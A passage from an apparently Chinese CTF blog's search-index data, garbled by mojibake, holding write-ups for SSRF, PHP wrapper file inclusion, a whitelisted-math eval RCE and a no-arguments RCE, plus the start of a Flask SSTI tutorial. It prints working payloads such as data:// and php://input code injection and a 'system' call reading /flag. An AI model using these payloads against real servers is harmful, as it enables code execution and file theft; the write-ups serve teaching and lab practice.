123q1&#x3D;y&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php?&amp;q3&#x3D;GET%25s%25&#x2F;&#x2F;admin.php?ä¸­çš„?æ˜¯ä¸ºäº†æŠŠæ‹¼æ¥çš„.y1ng.txtå½“æˆå‚æ•°åºŸæ‰&#x2F;&#x2F;%25æ˜¯%çš„urlç¼–ç ,ç¬¬ä¸€ä¸ª%sæ˜¯ä¸ºäº†æ ¼å¼åŒ–å¾—åˆ°detectçš„å€¼,ç¬¬äºŒä¸ª%æ˜¯ä¸ºè½¬ç§»æ‰%dä½¿å…¶å˜æˆ%%d,æ ¼å¼åŒ–è¾“å‡ºç»“æœå°±æ˜¯%d å¾—åˆ°admin.phpçš„æºç , 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phperror_reporting(0);session_start();$f1ag &#x3D; &#39;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#39;; &#x2F;&#x2F;fakefunction aesEn($data, $key)&#123; $method &#x3D; &#39;AES-128-CBC&#39;; $iv &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;function Check()&#123; if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] &#x3D;&#x3D;&#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] &#x3D;&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;))) return true; else return false;&#125;if ( $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D;&#x3D; &quot;127.0.0.1&quot; ) &#123; highlight_file(__FILE__);&#125; else &#123; echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body bgcolor&#x3D;black&gt;&lt;center&gt;&lt;font size&#x3D;&#39;10px&#39; color&#x3D;white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];&#125;$_SESSION[&#39;user&#39;] &#x3D; md5($_SERVER[&#39;REMOTE_ADDR&#39;]);if (isset($_GET[&#39;decrypt&#39;])) &#123; $decr &#x3D; $_GET[&#39;decrypt&#39;]; if (Check())&#123; $data &#x3D; $_SESSION[&#39;secret&#39;]; include &#39;flag_2sln2ndln2klnlksnf.php&#39;; $cipher &#x3D; aesEn($data, &#39;y1ng&#39;); if ($decr &#x3D;&#x3D;&#x3D; $cipher)&#123; echo WHAT_YOU_WANT; &#125; else &#123; die(&#39;çˆ¬&#39;); &#125; &#125; else&#123; header(&quot;Refresh:0.1;url&#x3D;index.php&quot;); &#125;&#125; else &#123; &#x2F;&#x2F;I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length &#x3D; mt_rand(40,80); $_SESSION[&#39;secret&#39;] &#x3D; bin2hex(random_bytes($length));&#125;?&gt; exp 12345678910111213141516171819function aesEn ($key) &#123; $method &#x3D; &#39;AES-128-CBC&#39;; $iv &#x3D; md5(&#39;174.0.222.75&#39;, true); return base64_encode(openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv));&#125;$url &#x3D; &quot;http:&#x2F;&#x2F;65a5817a-c324-407c-af18-b7c448bc09b4.node3.buuoj.cn&#x2F;admin.php?decrypt&#x3D;&quot;;$cookes &#x3D; &quot;y1ng&#x3D;8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address&#x3D;76d9f00467e5ee6abc3ca60892ef304e&quot;;$curl &#x3D; curl_init();curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_COOKIE, $cookes);$cipher &#x3D; aesEn(&#39;y1ng&#39;);$url &#x3D; $url . urlencode($cipher);curl_setopt($curl, CURLOPT_URL, $url);$result &#x3D; curl_exec($curl);var_dump($result);?&gt;&#x2F;&#x2F;åŠ å¯†æ–¹å¼çŸ¥é“,æ‰€ä»¥è®¿é—®ä¸€ä¸‹admin.phpå¾—åˆ°ä½ è®¿é—®çš„ip&#x2F;&#x2F;ä¸ç©¿PHPsessionid,sessionå°±ä¸ºç©º,æ‰€ä»¥åŠ å¯†çš„dataç­‰äºnull,åªè¦åŠ å¯†keyå°±è¡Œ MISCæœ€ç®€å•MISC7zæ‰“å¼€,è§£å‹å¾—åˆ°æ–‡ä»¶sercet winhexæŸ¥çœ‹,ç¼ºå°‘PNGçš„æ–‡ä»¶å¤´,è¡¥ä¸Šæ–‡ä»¶å¤´å†ä¿®æ”¹åç¼€ä¸ºpngæ‰“å¼€å¾—åˆ°flag A_Beautiful_Picturewinhexæ‰“å¼€,å›¾ç‰‡é«˜æ”¹é«˜å¾—åˆ°flag EasyBaBabinwalkåˆ†æå›¾ç‰‡ åˆ†ç†å‡ºå‹ç¼©åŒ…,å‹ç¼©åŒ…å†…æ˜¯è§†é¢‘,æ‰“å¼€è§†é¢‘,ä¸­é—´æœ‰ä¸€ä¸²å¾ˆå¿«çš„å›¾ç‰‡ ç”¨windowsè‡ªå¸¦çš„ç…§ç‰‡è§†é¢‘æ‰“å¼€,ç‚¹ç¼–è¾‘,ä¸€å¸§å¸§çš„çœ‹,æœ‰äºŒç»´ç çš„é¡µé¢æ‰«ç å¾—åˆ°ä¸‹é¢æ–‡å­— 1424A447B79316E677A756973687561697D hexè½¬ASCII,è°ƒæ•´ä¸€ä¸‹é¡ºåºç»„æˆä¸€å¥è¯,å¾—åˆ°flag å°å§å§1strings xiaojiejie.jpeg|grep BJD Cryptoç­¾åˆ°-y1ngbase64è§£ç å¾—åˆ°flag è€æ–‡ç›²ç”¨ç™¾åº¦ç¿»è¯‘æœ—è¯» BJD{è¿™å°±æ˜¯flag},ä¸­é—´æ˜¯åŸæ±‰å­— ç‡•è¨€ç‡•è¯­179616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20 hexè½¬ASCII å¾—åˆ°ï¼šyanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; å¦‚æœæ˜¯rot13,åç§»é‡åº”è¯¥ç›¸åŒ,ä½†æ˜¯è¿™é‡Œä¸åŒ,æ‰€ä»¥æ˜¯ç»´å‰å°¼äºšå¯†ç  yanzi æ˜¯ keyï¼Œè§£å¯†ä¸€ä¸‹å¾—åˆ° flag çµèƒ½ç²¾é€šä¸‹è½½å¾—åˆ°jpg,æ”¹åç¼€ä¸ºjpg,æ‰“å¼€å‘ç°æ˜¯ä¸€äº›ç¬¦å·,æœç´¢ä¸€ä¸‹å¾—çŸ¥æ˜¯åœ£å ‚æ­¦å£«å¯†ç ,æ˜¯çŒªåœˆå¯†ç çš„å˜å½¢ å¯¹åº”è§£å¯†å¾—åˆ°IMKNIGHTSTEMPLARåŒ…ä¸Šflagflag&#123;IMKNIGHTSTEMPLAR&#125; cat_flagçŒ«è½¬äºŒè¿›åˆ¶ 123456789101101000010010010100100010001111011010011010010000101100001001100000111111001111101BJD&#123;M!a0~&#125;","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"PHPä¼ªåè®®","date":"2020-03-15T16:00:00.000Z","path":"2020/03/16/CTF/phpä¼ªåè®®/","text":"PHPä¼ªåè®®0x00 ä½•ä¸ºä¼ªåè®®PHPå®˜ç½‘çš„è§£é‡Š: PHP å¸¦æœ‰å¾ˆå¤šå†…ç½® URL é£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼ fopen()ã€ copy()ã€ file_exists() å’Œ filesize() çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚ é™¤äº†è¿™äº›å°è£…åè®®ï¼Œè¿˜èƒ½é€šè¿‡ stream_wrapper_register() æ¥æ³¨å†Œè‡ªå®šä¹‰çš„å°è£…åè®®ã€‚ æ”¯æŒçš„åè®®: 123456789101112file:&#x2F;&#x2F; â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿhttp:&#x2F;&#x2F; â€” è®¿é—® HTTP(s) ç½‘å€ftp:&#x2F;&#x2F; â€” è®¿é—® FTP(s) URLsphp:&#x2F;&#x2F; â€” è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆI&#x2F;O streamsï¼‰zlib:&#x2F;&#x2F; â€” å‹ç¼©æµdata:&#x2F;&#x2F; â€” æ•°æ®ï¼ˆRFC 2397ï¼‰glob:&#x2F;&#x2F; â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼phar:&#x2F;&#x2F; â€” PHP å½’æ¡£ssh2:&#x2F;&#x2F; â€” Secure Shell 2rar:&#x2F;&#x2F; â€” RARogg:&#x2F;&#x2F; â€” éŸ³é¢‘æµexpect:&#x2F;&#x2F; â€” å¤„ç†äº¤äº’å¼çš„æµ 0x01 ç”¨æ³•file:// PHP.iniï¼šfile:// åè®®åœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼›allow_url_fopen ï¼šoff/onallow_url_includeï¼šoff/on file:// ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨CTFä¸­é€šå¸¸ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ ä¸”ä¸å—allow_url_fopenä¸allow_url_includeçš„å½±å“ 123456789&#x2F;&#x2F;file.php&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123; include $_GET[&#39;file&#39;];&#125;?&gt;&#x2F;&#x2F;ä½¿ç”¨file:&#x2F;&#x2F; [æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶å]æ¥è®¿é—®æ–‡ä»¶http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?file&#x3D;&#x2F;var&#x2F;www&#x2F;&#x2F;html&#x2F;phpinfo.php php:// php://filteråœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼›php://inputã€ php://stdinã€ php://memory å’Œ php://temp éœ€è¦å¼€å¯allow_url_includeã€‚ php:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://input php://filterç”¨äºè¯»å–æºç  php://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚ php://filterphp://filter æ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œ è®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚ è¿™å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€ file() å’Œ file_get_contents()ï¼Œ åœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚ 123456resource&#x3D;&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt; è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚read&#x3D;&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚write&#x3D;&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt; è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚&lt;;ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt; ä»»ä½•æ²¡æœ‰ä»¥ read&#x3D; æˆ– write&#x3D; ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&#x2F;&#x2F;å¯ä»¥ä»¥base64ç¼–ç çš„æ–¹å¼è¯»å–index.phpçš„å†…å®¹ è¿‡æ»¤å™¨å­—ç¬¦ä¸²è¿‡æ»¤å™¨1234string.rot13 ç­‰åŒäºç”¨ str_rot13()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®string.toupper ç­‰åŒäºç”¨ strtoupper()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®string.tolower ç­‰åŒäºç”¨ strtolower()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®string.strip_tags ç­‰åŒäºç”¨ strip_tags()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ® è½¬æ¢è¿‡æ»¤å™¨1234convert.base64-encode ç­‰åŒäºbase64_encode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®convert.base64-decode ç­‰åŒäºbase64_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ®convert.quoted-printable-encode æ²¡æœ‰å¯¹åº”å‡½æ•°convert.quoted-printable-decode ç­‰åŒäºç”¨ quoted_printable_decode()å‡½æ•°å¤„ç†æ‰€æœ‰çš„æµæ•°æ® å‹ç¼©è¿‡æ»¤å™¨12zlib.deflate å‹ç¼©zlib.inflate è§£å‹ åŠ å¯†è¿‡æ»¤å™¨mcrypt mdecrypt ç”¨çš„ä¸å¤š,ä¸è¯´äº† php://inputphp://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ,å¯ä»¥è¯»å–åˆ°postæ²¡æœ‰è§£æçš„åŸå§‹æ•°æ®, å°†postè¯·æ±‚ä¸­çš„æ•°æ®ä½œä¸ºPHPä»£ç æ‰§è¡Œã€‚å› ä¸ºå®ƒä¸ä¾èµ–äºç‰¹å®šçš„ php.ini æŒ‡ä»¤ã€‚ æ³¨ï¼šenctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚ allow_url_fopen ï¼šoff/onallow_url_includeï¼šon payload 123url:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?page&#x3D;php:&#x2F;&#x2F;input&#x2F;&#x2F;postdataa&#x3D;&lt;?php phpinfo();?&gt; å®ä¾‹ 12345678910111213$user &#x3D; $_GET[&quot;user&quot;];$file &#x3D; $_GET[&quot;file&quot;];$pass &#x3D; $_GET[&quot;pass&quot;];if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;the user is admin&quot;))&#123; echo &quot;hello admin!&lt;br&gt;&quot;; include($file); &#x2F;&#x2F;class.php&#125;else&#123; echo &quot;you are not admin ! &quot;;&#125;è§£æ³•ä¸º url&#x2F;index.php?user&#x3D;php:&#x2F;&#x2F;input [POSTDATA] the user is adminæœ€åè¾“å‡ºä¸ºhello admin!å¹¶ä¸”åŒ…å«å¯¹åº”æ–‡ä»¶ php://outputæ˜¯ä¸€ä¸ªåªå†™çš„æ•°æ®æµï¼Œ å…è®¸ä½ ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼ å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚ payload 1234567#file.php&lt;?php $code&#x3D;$_GET[&quot;page&quot;]; file_put_contents($code,&quot;test&quot;); ?&gt;url:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?page&#x3D;php:&#x2F;&#x2F;output&#x2F;&#x2F;ç»“æœè¾“å‡ºtest data://data:èµ„æºç±»å‹;ç¼–ç ,å†…å®¹æ•°æ®æµå°è£…å™¨å½“allow_url_include æ‰“å¼€çš„æ—¶å€™ï¼Œä»»æ„æ–‡ä»¶åŒ…å«å°±ä¼šæˆä¸ºä»»æ„å‘½ä»¤æ‰§è¡Œ PHP.iniï¼šdata://åè®®å¿…é¡»åŒåœ¨onæ‰èƒ½æ­£å¸¸ä½¿ç”¨ï¼›allow_url_fopen ï¼šonallow_url_includeï¼šonphp ç‰ˆæœ¬å¤§äºç­‰äº php5.2 payload 12345678$file.php&lt;?php $filename&#x3D;$_GET[&quot;a&quot;]; include(&quot;$filename&quot;); ?&gt;http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;orhttp:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D; zip://, bzip2://, zlib:// PHP.iniï¼šzip://, bzip2://, zlib://åè®®åœ¨åŒoffçš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼›allow_url_fopen ï¼šoff/onallow_url_includeï¼šoff/on 12343ä¸ªå°è£…åè®®ï¼Œéƒ½æ˜¯ç›´æ¥æ‰“å¼€å‹ç¼©æ–‡ä»¶ã€‚compress.zlib:&#x2F;&#x2F;file.gz - å¤„ç†çš„æ˜¯ &#39;.gz&#39; åç¼€çš„å‹ç¼©åŒ…compress.bzip2:&#x2F;&#x2F;file.bz2 - å¤„ç†çš„æ˜¯ &#39;.bz2&#39; åç¼€çš„å‹ç¼©åŒ…zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt - å¤„ç†çš„æ˜¯ &#39;.zip&#39; åç¼€çš„å‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶ æ³¨ï¼šzip://, bzip2://, zlib:// å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åã€‚ zip://php ç‰ˆæœ¬å¤§äºç­‰äº php5.3.0 payload 1234zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txtzip:&#x2F;&#x2F; [å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]#[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]**è¦ç”¨ç»å¯¹è·¯å¾„+urlç¼–ç # bzip2://payload 12compress.bzip2:&#x2F;&#x2F;file.bz2ç›¸å¯¹è·¯å¾„ä¹Ÿå¯ä»¥ ç¤ºä¾‹ 1234ç”¨7-zipç”Ÿæˆä¸€ä¸ªbz2å‹ç¼©æ–‡ä»¶ã€‚pyload:http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;test.bz2æˆ–è€…æ–‡ä»¶æ”¹ä¸ºjpgåç¼€http:&#x2F;&#x2F;127.0.0.1&#x2F;file.php?a&#x3D;compress.bzip2:&#x2F;&#x2F;test.jpg zlib://åŒç†","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://yanmymickey.github.io/tags/PHP/"}]},{"title":"[CISCN 2019 åˆèµ›]Love Math","date":"2020-03-15T16:00:00.000Z","path":"2020/03/16/CTF_WP/[CISCN 2019 åˆèµ›]Love Math/","text":"[CISCN 2019 åˆèµ›]Love Math WP12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);&#x2F;&#x2F;å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#39;c&#39;]))&#123; show_source(__FILE__);&#125;else&#123; &#x2F;&#x2F;ä¾‹å­ c&#x3D;20-1 $content &#x3D; $_GET[&#39;c&#39;]; if (strlen($content) &gt;&#x3D; 80) &#123; die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;); &#125; $blacklist &#x3D; [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\\[&#39;, &#39;\\]&#39;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;); &#125; &#125; &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;]; preg_match_all(&#39;&#x2F;[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*&#x2F;&#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;); &#125; &#125; &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125; payload123456?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flagbase_convert(37907361743,10,36)&#x3D;&gt;hex2bindechex(1598506324)&#x3D;&gt;&quot;5f474554&quot;hex2bin(&quot;5f474554&quot;)&#x3D;&gt;_GET$$pi&#x3D;&gt;$_GET($$pi)&#123;pi&#125;(($$pi)&#123;cos&#125;)&amp;pi&#x3D;system&amp;cos&#x3D;cat &#x2F;flag&#x3D;&gt;$_GET&#123;pi&#125;$_GET&#123;cos&#125;pi&#x3D;system&amp;cos&#x3D;cat ç›¸åŒç±»å‹ [NESTCTF 2019]Love Math 1 [NESTCTF 2019]Love Math 2 Reference[CISCN 2019 åˆèµ›]Love Math","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ","date":"2020-03-15T16:00:00.000Z","path":"2020/03/16/CTF_WP/[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ WP/","text":"[GXYCTF2019]ç¦æ­¢å¥—å¨ƒçŸ¥è¯†ç‚¹123456789localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚scandir() åˆ—å‡º images ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚pos() current() çš„åˆ«åã€‚next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚array_reverse()ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚highlight_file()æ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ã€‚show_source() æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ WPimgåé¢çš„å‚æ•°base32,base63,hexè§£ç å¾—555.png index.php hex,base64,base32ç¼–ç ä¼ å‚imgåœ¨ç½‘é¡µæºä»£ç imgæ ‡ç­¾è§£ç base64å¾—åˆ°æºç  123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123; if (!preg_match(&#39;&#x2F;data:\\&#x2F;\\&#x2F;|filter:\\&#x2F;\\&#x2F;|php:\\&#x2F;\\&#x2F;|phar:\\&#x2F;\\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123; if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\\((?R)?\\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123; if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123; &#x2F;&#x2F; echo $_GET[&#39;exp&#39;]; @eval($_GET[&#39;exp&#39;]); &#125; else&#123; die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;); &#125; &#125; else&#123; die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;); &#125; &#125; else&#123; die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;); &#125;&#125;&#x2F;&#x2F; highlight_file(__FILE__);?&gt; payload1?exp&#x3D;show_source(next(array_reverse(scandir(current(localeconv()))))); ä¸»è¦åˆ©ç”¨ç‚¹pos(localeconv())æˆ–è€…current(localeconv())å˜æˆ. array_reverseæ•°ç»„åè½¬ nextå°†æŒ‡é’ˆæŒ‡å‘ç¬¬äºŒä¸ª,ä¸ºflag.php","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"WP","slug":"WP","permalink":"https://yanmymickey.github.io/tags/WP/"}]},{"title":"FlaskSSTI","date":"2020-03-14T16:00:00.000Z","path":"2020/03/15/CTF/FlaskSSTIå§¿åŠ¿/","text":"FlaskSSTI0x00é­”æœ¯æ–¹æ³• dictï¼šä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸ classï¼šè¿”å›è°ƒç”¨çš„å‚æ•°ç±»å‹ mroï¼šè¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚ basesï¼šè¿”å›ç±»å‹åˆ—è¡¨ subclassesï¼šè¿”å›objectçš„å­ç±» initï¼šç±»çš„åˆå§‹åŒ–æ–¹æ³• globalsï¼šå‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡ ä¸ func_globals ç­‰ä»· __base__ å’Œ __mro__ éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„ã€‚ 0x01åŸºæœ¬æµç¨‹å¯ä»¥åˆ©ç”¨2ç®€å•ä»£ç æµ‹è¯•æ˜¯å¦å­˜åœ¨SSTI ä½¿ç”¨é­”æœ¯æ–¹æ³•è¿›è¡Œå‡½æ•°è§£æï¼Œå†è·å–åŸºæœ¬ç±»objectï¼š 12345&#39;&#39;.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[8] &#x2F;&#x2F;é’ˆå¯¹jinjia2&#x2F;flaskä¸º[9]é€‚ç”¨ è·å–åˆ°åŸºæœ¬ç±»ä¹‹å,å¯ä»¥ç»§ç»­ä½¿ç”¨subclassesè·å–objectçš„å­ç±»: 1234object.__subclasses__()#æ”¹å˜æ•°å­—å¯ä»¥çˆ†ç ´object.__subclasses__[10] æ‰¾åˆ°é‡è½½è¿‡çš„__init__ç±»ï¼ˆåœ¨è·å–åˆå§‹åŒ–å±æ€§åï¼Œå¸¦ wrapper 